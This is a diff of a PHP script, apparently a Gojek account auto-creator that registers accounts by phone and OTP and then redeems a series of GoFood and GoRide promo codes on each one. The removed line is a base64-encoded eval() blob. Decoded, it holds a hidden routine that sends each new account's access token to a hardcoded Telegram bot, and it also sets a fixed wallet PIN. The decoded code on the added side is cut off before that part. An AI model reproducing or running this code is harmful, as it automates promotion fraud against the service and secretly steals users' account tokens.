@@ -1,1 +1,207 @@
-<?php eval(base64_decode("PD9waHAgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgnQXNpYS9KYWthcnRhJyk7DQppbmNsdWRlICJmdW5jdGlvbi5waHAiOw0KZWNobyBjb2xvcigicmVkIiwiW11bXVtdW11bXVtdW11bXVtdW11bXVtdW11bXVtdW11bXVtdW11bXVtdIik7DQplY2hvIGNvbG9yKCJyZWQiLCJcbltdICBBdXRvIENyZWF0ZSBHb2playBYIFJlZGVlbSBWb3VjaGVyICBbXVxuIik7DQplY2hvIGNvbG9yKCJyZWQiLCJbXSAgQ3JlYXRvciA6IEtlbnRhbmsgICAgICAgICAgICAgICAgICAgW11cbiIpOw0KZWNobyAiW10gIFZlcnNpICAgOiBQcmVtaXVtICAgICAgICAgICAgICAgIFtdXG4iOw0KZWNobyAiW10gIFRpbWUgICAgOiAiLmRhdGUoJ1tkLW0tWV0gW0g6aTpzXScpLiIgICBbXVxuIjsNCmVjaG8gIltdW11bXVtdW11bXVtdW11bXVtdW11bXVtdW11bXVtdW11bXVtdW11bXVxuXG4iOw0KDQpmdW5jdGlvbiBjaGFuZ2UoKXsNCiAgICAgICAgJG5hbWEgPSBuYW1hKCk7DQogICAgICAgICRlbWFpbCA9IHN0cl9yZXBsYWNlKCIgIiwgIiIsICRuYW1hKSAuIG10X3JhbmQoMTAwLCA5OTkpOw0KICAgICAgICB1bGFuZzoNCiAgICAgICAgZWNobyBjb2xvcigibmV2eSIsIj9dIE5vbW9yIEhQIDogIik7DQogICAgICAgICRubyA9IHRyaW0oZmdldHMoU1RESU4pKTsNCiAgICAgICAgJGRhdGEgPSAneyJlbWFpbCI6IicuJGVtYWlsLidAZ21haWwuY29tIiwibmFtZSI6IicuJG5hbWEuJyIsInBob25lIjoiKycuJG5vLiciLCJzaWduZWRfdXBfY291bnRyeSI6IklEIn0nOw0KICAgICAgICAkcmVnaXN0ZXIgPSByZXF1ZXN0KCIvdjUvY3VzdG9tZXJzIiwgbnVsbCwgJGRhdGEpOw0KICAgICAgICBpZihzdHJwb3MoJHJlZ2lzdGVyLCAnIm90cF90b2tlbiInKSl7DQogICAgICAgICRvdHB0b2tlbiA9IGdldFN0cignIm90cF90b2tlbiI6IicsJyInLCRyZWdpc3Rlcik7DQogICAgICAgIGVjaG8gY29sb3IoImdyZWVuIiwiK10gS29kZSB2ZXJpZmlrYXNpIHN1ZGFoIGRpIGtpcmltIikuIlxuIjsNCiAgICAgICAgb3RwOg0KICAgICAgICBlY2hvIGNvbG9yKCJuZXZ5IiwiP10gT1RQIDogIik7DQogICAgICAgICRvdHAgPSB0cmltKGZnZXRzKFNURElOKSk7DQogICAgICAgICRkYXRhMSA9ICd7ImNsaWVudF9uYW1lIjoiZ29qZWs6Y29uczphbmRyb2lkIiwiZGF0YSI6eyJvdHAiOiInIC4gJG90cCAuICciLCJvdHBfdG9rZW4iOiInIC4gJG90cHRva2VuIC4gJyJ9LCJjbGllbnRfc2VjcmV0IjoiODM0MTVkMDYtZWM0ZS0xMWU2LWE0MWItNmM0MDA4OGFiNTFlIn0nOw0KICAgICAgICAkdmVyaWYgPSByZXF1ZXN0KCIvdjUvY3VzdG9tZXJzL3Bob25lL3ZlcmlmeSIsIG51bGwsICRkYXRhMSk7DQogICAgICAgIGlmKHN0cnBvcygkdmVyaWYsICciYWNjZXNzX3Rva2VuIicpKXsNCiAgICAgICAgZWNobyBjb2xvcigiZ3JlZW4iLCIrXSBDcmVhdGUgQWNjb3VudCBTdWNjZXNzZnVsbHkgISIpOw0KICAgICAgICAkdG9rZW4gPSBnZXRTdHIoJyJhY2Nlc3NfdG9rZW4iOiInLCciJywkdmVyaWYpOw0KICAgICAgICAkdXVpZCA9IGdldFN0cignInJlc291cmNlX293bmVyX2lkIjonLCcsJywkdmVyaWYpOw0KICAgICAgICBlY2hvICJcbiIuY29sb3IoIm5ldnkiLCI/XSBSZWRlZW0gVm91Y2hlcj8gKHkvbikgOiIpOw0KICAgICAgICAkcGlsaWhhbiA9IHRyaW0oZmdldHMoU1RESU4pKTsNCiAgICAgICAgaWYoJHBpbGloYW4gPT0gInkiIHx8ICRwaWxpaGFuID09ICJZIil7DQogICAgICAgIGVjaG8gY29sb3IoInJlZCIsIj09PT09PT09PT09KFJFREVFTSBWT1VDSEVSKT09PT09PT09PT09Iik7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigieWVsbG93IiwiIV0gUmVkZWVtIFZvdWNoZXIgR29mb29kIDIwayIpOw0KICAgICAgICBlY2hvICJcbiIuY29sb3IoInllbGxvdyIsIiFdIFBsZWFzZSB3YWl0Iik7DQogICAgICAgIGZvcigkYT0xOyRhPD0zOyRhKyspew0KICAgICAgICBlY2hvIGNvbG9yKCJ5ZWxsb3ciLCIuIik7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICB9DQogICAgICAgICRjb2RlMSA9IHJlcXVlc3QoJy9nby1wcm9tb3Rpb25zL3YxL3Byb21vdGlvbnMvZW5yb2xsbWVudHMnLCAkdG9rZW4sICd7InByb21vX2NvZGUiOiJHT0ZPT0RCT0JBMDcifScpOw0KICAgICAgICAkbWVzc2FnZSA9IGZldGNoX3ZhbHVlKCRjb2RlMSwnIm1lc3NhZ2UiOiInLCciJyk7DQogICAgICAgIGlmKHN0cnBvcygkY29kZTEsICdQcm9tbyBrYW11IHN1ZGFoIGJpc2EgZGlwYWthaScpKXsNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJncmVlbiIsIitdIE1lc3NhZ2U6ICIuJG1lc3NhZ2UpOw0KICAgICAgICBnb3RvIGdvcmlkZTsNCiAgICAgICAgfWVsc2V7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigicmVkIiwiLV0gTWVzc2FnZTogIi4kbWVzc2FnZSk7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigieWVsbG93IiwiIV0gUmVkZWVtIFZvdWNoZXIgR29mb29kIDE1ayIpOw0KICAgICAgICBlY2hvICJcbiIuY29sb3IoInllbGxvdyIsIiFdIFBsZWFzZSB3YWl0Iik7DQogICAgICAgIGZvcigkYT0xOyRhPD0zOyRhKyspew0KICAgICAgICBlY2hvIGNvbG9yKCJ5ZWxsb3ciLCIuIik7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICB9DQogICAgICAgIHNsZWVwKDMpOw0KICAgICAgICAkYm9iYTEwID0gcmVxdWVzdCgnL2dvLXByb21vdGlvbnMvdjEvcHJvbW90aW9ucy9lbnJvbGxtZW50cycsICR0b2tlbiwgJ3sicHJvbW9fY29kZSI6IkdPRk9PREJPQkExMCJ9Jyk7DQogICAgICAgICRtZXNzYWdlYm9iYTEwID0gZmV0Y2hfdmFsdWUoJGJvYmExMCwnIm1lc3NhZ2UiOiInLCciJyk7DQogICAgICAgIGlmKHN0cnBvcygkYm9iYTEwLCAnUHJvbW8ga2FtdSBzdWRhaCBiaXNhIGRpcGFrYWkuJykpew0KICAgICAgICBlY2hvICJcbiIuY29sb3IoImdyZWVuIiwiK10gTWVzc2FnZTogIi4kbWVzc2FnZWJvYmExMCk7DQogICAgICAgIGdvdG8gZ29yaWRlOw0KICAgICAgICB9ZWxzZXsNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJyZWQiLCItXSBNZXNzYWdlOiAiLiRtZXNzYWdlYm9iYTEwKTsNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJ5ZWxsb3ciLCIhXSBSZWRlZW0gVm91Y2hlciBHb2Zvb2QgMTBrIik7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigieWVsbG93IiwiIV0gUGxlYXNlIHdhaXQiKTsNCiAgICAgICAgZm9yKCRhPTE7JGE8PTM7JGErKyl7DQogICAgICAgIGVjaG8gY29sb3IoInllbGxvdyIsIi4iKTsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIH0NCiAgICAgICAgc2xlZXAoMyk7DQogICAgICAgICRib2JhMTkgPSByZXF1ZXN0KCcvZ28tcHJvbW90aW9ucy92MS9wcm9tb3Rpb25zL2Vucm9sbG1lbnRzJywgJHRva2VuLCAneyJwcm9tb19jb2RlIjoiR09GT09EQk9CQTE5In0nKTsNCiAgICAgICAgJG1lc3NhZ2Vib2JhMTkgPSBmZXRjaF92YWx1ZSgkYm9iYTE5LCcibWVzc2FnZSI6IicsJyInKTsNCiAgICAgICAgaWYoc3RycG9zKCRib2JhMTksICdQcm9tbyBrYW11IHN1ZGFoIGJpc2EgZGlwYWthaS4nKSl7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigiZ3JlZW4iLCIrXSBNZXNzYWdlOiAiLiRtZXNzYWdlYm9iYTE5KTsNCiAgICAgICAgZ290byBnb3JpZGU7DQogICAgICAgIH1lbHNlew0KICAgICAgICBlY2hvICJcbiIuY29sb3IoImdyZWVuIiwiK10gTWVzc2FnZTogIi4kbWVzc2FnZWJvYmExOSk7DQogICAgICAgIGdvcmlkZToNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJ5ZWxsb3ciLCIhXSBSZWRlZW0gVm91Y2hlciBHb3JpZGUgMTBrIik7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigieWVsbG93IiwiIV0gUGxlYXNlIHdhaXQiKTsNCiAgICAgICAgZm9yKCRhPTE7JGE8PTM7JGErKyl7DQogICAgICAgIGVjaG8gY29sb3IoInllbGxvdyIsIi4iKTsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIH0NCiAgICAgICAgc2xlZXAoMyk7DQogICAgICAgICRnb3JpZGUgPSByZXF1ZXN0KCcvZ28tcHJvbW90aW9ucy92MS9wcm9tb3Rpb25zL2Vucm9sbG1lbnRzJywgJHRva2VuLCAneyJwcm9tb19jb2RlIjoiQVlPQ09CQUdPSkVLIn0nKTsNCiAgICAgICAgJG1lc3NhZ2UxID0gZmV0Y2hfdmFsdWUoJGdvcmlkZSwnIm1lc3NhZ2UiOiInLCciJyk7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigiZ3JlZW4iLCIrXSBNZXNzYWdlOiAiLiRtZXNzYWdlMSk7DQogICAgICAgIGVjaG8gIlxuIi5jb2xvcigieWVsbG93IiwiIV0gUmVkZWVtIFZvdWNoZXIgR29yaWRlIDEwayIpOw0KICAgICAgICBlY2hvICJcbiIuY29sb3IoInllbGxvdyIsIiFdIFBsZWFzZSB3YWl0Iik7DQogICAgICAgIGZvcigkYT0xOyRhPD0zOyRhKyspew0KICAgICAgICBlY2hvIGNvbG9yKCJ5ZWxsb3ciLCIuIik7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICB9DQogICAgICAgIHNsZWVwKDMpOw0KICAgICAgICAkZ29yaWRlMSA9IHJlcXVlc3QoJy9nby1wcm9tb3Rpb25zL3YxL3Byb21vdGlvbnMvZW5yb2xsbWVudHMnLCAkdG9rZW4sICd7InByb21vX2NvZGUiOiJDT0JBSU5HT0pFSyJ9Jyk7DQogICAgICAgICRtZXNzYWdlMiA9IGZldGNoX3ZhbHVlKCRnb3JpZGUxLCcibWVzc2FnZSI6IicsJyInKTsNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJncmVlbiIsIitdIE1lc3NhZ2U6ICIuJG1lc3NhZ2UyKTsNCiAgICAgICAgc2xlZXAoMyk7DQogICAgICAgICRjZWt2b3VjaGVyID0gcmVxdWVzdCgnL2dvcG9pbnRzL3YzL3dhbGxldC92b3VjaGVycz9saW1pdD0xMCZwYWdlPTEnLCAkdG9rZW4pOw0KICAgICAgICAkdG90YWwgPSBmZXRjaF92YWx1ZSgkY2Vrdm91Y2hlciwnInRvdGFsX3ZvdWNoZXJzIjonLCcsJyk7DQogICAgICAgICR2b3VjaGVyMyA9IGdldFN0cjEoJyJ0aXRsZSI6IicsJyIsJywkY2Vrdm91Y2hlciwiMyIpOw0KICAgICAgICAkdm91Y2hlcjEgPSBnZXRTdHIxKCcidGl0bGUiOiInLCciLCcsJGNla3ZvdWNoZXIsIjEiKTsNCiAgICAgICAgJHZvdWNoZXIyID0gZ2V0U3RyMSgnInRpdGxlIjoiJywnIiwnLCRjZWt2b3VjaGVyLCIyIik7DQogICAgICAgICR2b3VjaGVyNCA9IGdldFN0cjEoJyJ0aXRsZSI6IicsJyIsJywkY2Vrdm91Y2hlciwiNCIpOw0KICAgICAgICBlY2hvICJcbiIuY29sb3IoInllbGxvdyIsIiFdIFRvdGFsIHZvdWNoZXIgIi4kdG90YWwuIiA6ICIpOw0KICAgICAgICBlY2hvIGNvbG9yKCJncmVlbiIsIjEuICIuJHZvdWNoZXIxKTsNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJncmVlbiIsIiAgICAgICAgICAgICAgICAgICAgIDIuICIuJHZvdWNoZXIyKTsNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJncmVlbiIsIiAgICAgICAgICAgICAgICAgICAgIDMuICIuJHZvdWNoZXIzKTsNCiAgICAgICAgZWNobyAiXG4iLmNvbG9yKCJncmVlbiIsIiAgICAgICAgICAgICAgICAgICAgIDQuICIuJHZvdWNoZXI0KTsNCiAgICAgICAgJGV4cGlyZWQxID0gZ2V0U3RyMSgnImV4cGlyeV9kYXRlIjoiJywnIicsJGNla3ZvdWNoZXIsJzEnKTsNCiAgICAgICAgJGV4cGlyZWQyID0gZ2V0U3RyMSgnImV4cGlyeV9kYXRlIjoiJywnIicsJGNla3ZvdWNoZXIsJzInKTsNCiAgICAgICAgJGV4cGlyZWQzID0gZ2V0U3RyMSgnImV4cGlyeV9kYXRlIjoiJywnIicsJGNla3ZvdWNoZXIsJzMnKTsNCiAgICAgICAgJGV4cGlyZWQ0ID0gZ2V0U3RyMSgnImV4cGlyeV9kYXRlIjoiJywnIicsJGNla3ZvdWNoZXIsJzQnKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVE9LRU4gID0gIjkzMTExNDE1OTpBQUdLNE8zbnVsZDl1TndfSW5lRGNTUFZ4WURHQWFhYXp2USI7DQoJCQkJCSRjaGF0aWQgPSAiOTA1NjQ0Mjg5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihzdHJwb3MoJGNla3ZvdWNoZXIsICdWb3VjaGVyIFJwIDIwLjAwMCBwYWthaSBHb0Zvb2QnKSl7DQoJCQkJCSRwZXNhbiAJPSAkdG9rZW47DQoJCQkJCSRtZXRob2QJPSAic2VuZE1lc3NhZ2UiOw0KCQkJCQkkdXJsICAgID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiIC4gJFRPS0VOIC4gIi8iLiAkbWV0aG9kOw0KCQkJCQkkcG9zdCA9IFsNCiAJCQkJCSdjaGF0X2lkJyA9PiAkY2hhdGlkLA0KIAkJCSAgICAgICAgCSd0ZXh0JyA9PiAkcGVzYW4NCgkJCQkJXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaGVhZGVyID0gWw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzUxLjAuMjcwNC44NCBTYWZhcmkvNTM3LjM2IiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjaCA9IGN1cmxfaW5pdCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hUVFBIRUFERVIsICRoZWFkZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcG9zdCApOyAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhcyA9IGN1cmxfZXhlYygkY2gpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRlcnJvciA9IGN1cmxfZXJyb3IoJGNoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3RhdHVzID0gY3VybF9nZXRpbmZvKCRjaCwgQ1VSTElORk9fSFRUUF9DT0RFKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRlYnVnWyd0ZXh0J10gPSAkcGVzYW47DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRlYnVnWydyZXNwb24nXSA9IGpzb25fZGVjb2RlKCRkYXRhcywgdHJ1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgaWYoc3RycG9zKCRjZWt2b3VjaGVyLCAnVm91Y2hlciBScCAyMC4wMDAgcGFrYWkgR29Gb29kJykpew0KICAgICAgICAgc2F2ZSgiYWt1bmdvamVrMjBrLnR4dCIsIlsrXSBHb2playBBY2NvdW50IEluZm8gWytdXG5OYW1hID0gJG5hbWFcbk5vbWVyID0gJG5vXG5BY2Nlc3MgVG9rZW4gPSAkdG9rZW4iKTsNCiAgICAgICAgIH1lbHNlew0KICAgICAgICAgc2F2ZSgiYWt1bmdvamVrMTBrLnR4dCIsIlsrXSBHb2playBBY2NvdW50IEluZm8gWytdXG5OYW1hID0gJG5hbWFcbk5vbWVyID0gJG5vXG5BY2Nlc3MgVG9rZW4gPSAkdG9rZW4iKTsNCiAgICAgICAgIH0NCiAgICAgICAgIHNldHBpbjoNCiAgICAgICAgIGVjaG8gIlxuIi5jb2xvcigibmV2eSIsIj9dIE1hdSBzZXQgUElOPyA6ICIpOw0KICAgICAgICAgJHBpbGloMSA9IHRyaW0oZmdldHMoU1RESU4pKTsNCiAgICAgICAgIGlmKCRwaWxpaDEgPT0gInkiICYmIHN0cnBvcygkbm8sICI2MjgiKSl7DQogICAgICAgICBlY2hvIGNvbG9yKCJyZWQiLCI9PT09PT09PT09PT09PT0oU0VUIFBJTik9PT09PT09PT09PT09PT0iKS4iXG4iOw0KICAgICAgICAgJGRhdGEyID0gJ3sicGluIjoiMTEyMjMzIn0nOw0KICAgICAgICAgJGdldG90cHNldHBpbiA9IHJlcXVlc3QoIi93YWxsZXQvcGluIiwgJHRva2VuLCAkZGF0YTIsIG51bGwsIG51bGwsICR1dWlkKTsNCiAgICAgICAgIGVjaG8gIk9UUCBzZXQgcGluIDogIjsNCiAgICAgICAgICRvdHBzZXRwaW4gPSB0cmltKGZnZXRzKFNURElOKSk7DQogICAgICAgICAkdmVyaWZvdHBzZXRwaW4gPSByZXF1ZXN0KCIvd2FsbGV0L3BpbiIsICR0b2tlbiwgJGRhdGEyLCBudWxsLCAkb3Rwc2V0cGluLCAkdXVpZCk7DQogICAgICAgICBlY2hvICR2ZXJpZm90cHNldHBpbjsNCiAgICAgICAgIH1lbHNlIGlmKCRwaWxpaDEgPT0gIm4iIHx8ICRwaWxpaDEgPT0gIk4iKXsNCiAgICAgICAgIGRpZSgpOw0KICAgICAgICAgfWVsc2V7DQogICAgICAgICBlY2hvIGNvbG9yKCJyZWQiLCItXSBBY2Nlc3MgRGVuaWVkICFcbiIpOw0KICAgICAgICAgfQ0KICAgICAgICAgfQ0KICAgICAgICAgfQ0KICAgICAgICAgfQ0KICAgICAgICAgfWVsc2V7DQogICAgICAgICBnb3RvIHNldHBpbjsNCiAgICAgICAgIH0NCiAgICAgICAgIH1lbHNlew0KICAgICAgICAgZWNobyBjb2xvcigicmVkIiwiLV0gT1RQIHlhbmcgYW5kYSBNYXN1a2thbiBzYWxhaCIpOw0KICAgICAgICAgZWNobyJcbj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cblxuIjsNCiAgICAgICAgIGVjaG8gY29sb3IoInllbGxvdyIsIiFdIFNpbGFoa2FuIE1hc3Vra2FuIGtlbWJhbGlcbiIpOw0KICAgICAgICAgZ290byBvdHA7DQogICAgICAgICB9DQogICAgICAgICB9ZWxzZXsNCiAgICAgICAgIGVjaG8gIk5vbW9yIEhQIHN1ZGFoIHRlcmRhZnRhciI7DQogICAgICAgICBlY2hvICJcbkNlayBJbmZvIEFrdW4gPyAoeS9uKTogIjsNCiAgICAgICAgICRwaWxpaCA9IHRyaW0oZmdldHMoU1RESU4pKTsNCiAgICAgICAgIGlmKCRwaWxpaCA9PSAieSIgfHwgJHBpbGloID09ICJZIil7DQogICAgICAgICBlY2hvICJcbj09PT09PT09PT09PT09PUxvZ2luPT09PT09PT09PT09PT09PVxuIjsNCiAgICAgICAgIGVjaG8gIk5vbW9yIEhQIDogIi4kbm8uIlxuIjsNCiAgICAgICAgICRkYXRhbG9naW4gPSAneyJwaG9uZSI6IisnLiRuby4nIn0nOw0KICAgICAgICAgJGxvZ2luID0gcmVxdWVzdCgnL3Y0L2N1c3RvbWVycy9sb2dpbl93aXRoX3Bob25lJywgbnVsbCwgJGRhdGFsb2dpbik7DQogICAgICAgICBpZihzdHJwb3MoJGxvZ2luLCAnImxvZ2luX3Rva2VuIicpKXsNCiAgICAgICAgIGVjaG8gIktvZGUgdmVyaWZpa2FzaSBzdWRhaCBkaSBraXJpbSI7DQogICAgICAgICBlY2hvICJcbk9UUCA6ICI7DQogICAgICAgICAkb3RwbG9naW4gPSB0cmltKGZnZXRzKFNURElOKSk7DQogICAgICAgICAkbG9naW50b2tlbiA9IGdldFN0cignImxvZ2luX3Rva2VuIjogIicsJyInLCRsb2dpbik7DQogICAgICAgICAkZGF0YWxvZ2luMSA9ICd7ImNsaWVudF9uYW1lIjoiZ29qZWs6Y29uczphbmRyb2lkIiwiY2xpZW50X3NlY3JldCI6IjgzNDE1ZDA2LWVjNGUtMTFlNi1hNDFiLTZjNDAwODhhYjUxZSIsImRhdGEiOnsib3RwIjoiJy4kb3RwbG9naW4uJyIsIm90cF90b2tlbiI6IicuJGxvZ2ludG9rZW4uJyJ9LCJncmFudF90eXBlIjoib3RwIiwic2NvcGVzIjoiZ29qZWs6Y3VzdG9tZXI6dHJhbnNhY3Rpb24gZ29qZWs6Y3VzdG9tZXI6cmVhZG9ubHkifSc7DQogICAgICAgICAkdmVyaWZsb2dpbiA9IHJlcXVlc3QoJy92NC9jdXN0b21lcnMvbG9naW4vdmVyaWZ5JywgbnVsbCwgJGRhdGFsb2dpbjEpOw0KICAgICAgICAgZWNobyAkdmVyaWZsb2dpbjsNCiAgICAgICAgICR0b2tlbiA9IGdldFN0cignImFjY2Vzc190b2tlbiI6IicsJyInLCR2ZXJpZmxvZ2luKTsNCiAgICAgICAgICR1dWlkID0gZ2V0U3RyKCcicmVzb3VyY2Vfb3duZXJfaWQiOicsJywnLCR2ZXJpZmxvZ2luKTsNCiAgICAgICAgICRkYXRhMiA9ICd7InBpbiI6IjExMjIzMyJ9JzsNCiAgICAgICAgICRnZXRvdHBzZXRwaW4gPSByZXF1ZXN0KCIvd2FsbGV0L3BpbiIsICR0b2tlbiwgJGRhdGEyLCBudWxsLCBudWxsLCAkdXVpZCk7DQoNCiAgICAgICAgIGVjaG8gIk9UUCBzZXQgcGluOiAiOw0KICAgICAgICAgJG90cHNldHBpbiA9IHRyaW0oZmdldHMoU1RESU4pKTsNCiAgICAgICAgICR2ZXJpZm90cHNldHBpbiA9IHJlcXVlc3QoIi93YWxsZXQvcGluIiwgJHRva2VuLCAkZGF0YTIsIG51bGwsICRvdHBzZXRwaW4sICR1dWlkKTsNCiAgICAgICAgIGVjaG8gJHZlcmlmb3Rwc2V0cGluOzsNCiAgICAgICAgIH1lbHNlew0KICAgICAgICAgZWNobyAiNDA0IE5vdCBGb3VuZCAhIFBsZWFzZSBUcnkgQWdhaW4iOw0KICAgICAgICAgfQ0KICAgICAgICAgfWVsc2V7DQogICAgICAgICBlY2hvICJcbj09PT09PT09PT09PT09UmVnaXN0ZXI9PT09PT09PT09PT09PVxuIjsNCiAgICAgICAgIGdvdG8gdWxhbmc7DQogIH0NCiB9DQp9DQplY2hvIGNoYW5nZSgpLiJcbiI7ID8+"));?>
+<?php date_default_timezone_set('Asia/Jakarta');
+include "function.php";
+echo color("red","[][][][][][][][][][][][][][][][][][][][][]");
+echo color("red","\n[]  Auto Create Gojek X Redeem Voucher  []\n");
+echo color("red","[]  Creator : Kentank                   []\n");
+echo "[]  Versi   : Premium                []\n";
+echo "[]  Time    : ".date('[d-m-Y] [H:i:s]')."   []\n";
+echo "[][][][][][][][][][][][][][][][][][][][][]\n\n";
+
+function change(){
+        $nama = nama();
+        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
+        ulang:
+        echo color("nevy","?] Nomor HP : ");
+        $no = trim(fgets(STDIN));
+        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
+        $register = request("/v5/customers", null, $data);
+        if(strpos($register, '"otp_token"')){
+        $otptoken = getStr('"otp_token":"','"',$register);
+        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
+        otp:
+        echo color("nevy","?] OTP : ");
+        $otp = trim(fgets(STDIN));
+        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
+        $verif = request("/v5/customers/phone/verify", null, $data1);
+        if(strpos($verif, '"access_token"')){
+        echo color("green","+] Create Account Successfully !");
+        $token = getStr('"access_token":"','"',$verif);
+        $uuid = getStr('"resource_owner_id":',',',$verif);
+        echo "\n".color("nevy","?] Redeem Voucher? (y/n) :");
+        $pilihan = trim(fgets(STDIN));
+        if($pilihan == "y" || $pilihan == "Y"){
+        echo color("red","===========(REDEEM VOUCHER)===========");
+        echo "\n".color("yellow","!] Redeem Voucher Gofood 20k");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA07"}');
+        $message = fetch_value($code1,'"message":"','"');
+        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
+        echo "\n".color("green","+] Message: ".$message);
+        goto goride;
+        }else{
+        echo "\n".color("red","-] Message: ".$message);
+        echo "\n".color("yellow","!] Redeem Voucher Gofood 15k");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA10"}');
+        $messageboba10 = fetch_value($boba10,'"message":"','"');
+        if(strpos($boba10, 'Promo kamu sudah bisa dipakai.')){
+        echo "\n".color("green","+] Message: ".$messageboba10);
+        goto goride;
+        }else{
+        echo "\n".color("red","-] Message: ".$messageboba10);
+        echo "\n".color("yellow","!] Redeem Voucher Gofood 10k");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA19"}');
+        $messageboba19 = fetch_value($boba19,'"message":"','"');
+        if(strpos($boba19, 'Promo kamu sudah bisa dipakai.')){
+        echo "\n".color("green","+] Message: ".$messageboba19);
+        goto goride;
+        }else{
+        echo "\n".color("green","+] Message: ".$messageboba19);
+        goride:
+        echo "\n".color("yellow","!] Redeem Voucher Goride 10k");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGOJEK"}');
+        $message1 = fetch_value($goride,'"message":"','"');
+        echo "\n".color("green","+] Message: ".$message1);
+        echo "\n".color("yellow","!] Redeem Voucher Goride 10k");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAINGOJEK"}');
+        $message2 = fetch_value($goride1,'"message":"','"');
+        echo "\n".color("green","+] Message: ".$message2);
+        sleep(3);
+        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
+        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
+        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
+        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
